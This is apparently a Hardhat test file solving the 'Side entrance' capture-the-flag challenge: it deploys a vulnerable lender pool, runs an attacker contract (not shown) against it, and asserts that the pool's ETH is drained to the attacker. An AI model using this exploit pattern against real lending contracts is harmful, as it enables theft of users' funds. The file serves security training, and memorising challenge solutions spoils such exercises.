import { BigNumber } from "@ethersproject/bignumber";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { ethers, run } from "hardhat";
import {
	SideEntranceAttacker,
	SideEntranceAttacker__factory,
	SideEntranceLenderPool,
	SideEntranceLenderPool__factory,
} from "../../typechain";
import { getBigNumber } from "../../utils";

describe("[Challenge] Side entrance", () => {
	let LenderPool: SideEntranceLenderPool;
	let Attack: SideEntranceAttacker;
	let owner: SignerWithAddress;
	let attacker: SignerWithAddress;
	const TOKENS_IN_POOL = getBigNumber(1000);
	const provider = ethers.provider;
	let attackerInitialEthBalance: BigNumber;

	before(async () => {
		[owner, attacker] = await ethers.getSigners();

		const attack = (await ethers.getContractFactory(
			"SideEntranceAttacker",
			attacker
		)) as SideEntranceAttacker__factory;
		Attack = await attack.deploy();
		run("balance", {account: attacker.address})

		const contractFactory = (await ethers.getContractFactory(
			"SideEntranceLenderPool",
			owner
		)) as SideEntranceLenderPool__factory;
		LenderPool = await contractFactory.deploy();

		await LenderPool.deposit({ value: TOKENS_IN_POOL });

		attackerInitialEthBalance = await attacker.getBalance();

		expect(await provider.getBalance(LenderPool.address)).to.equal(TOKENS_IN_POOL);
	});

	it("Exploit", async () => {
		await Attack.attack(LenderPool.address);
		await LenderPool.connect(attacker).withdraw();
	});

	after(async () => {
		/** SUCCESS CONDITIONS */
		expect(
			await provider.getBalance(LenderPool.address)
		).to.equal('0');

		// Not checking exactly how much is the final balance of the attacker,
		// because it'll depend on how much gas the attacker spends in the attack
		// If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
		expect(
			(await provider.getBalance(attacker.address))
			.gt(attackerInitialEthBalance)
		).to.be.true;
		run("balance", {account: attacker.address})
	});
});
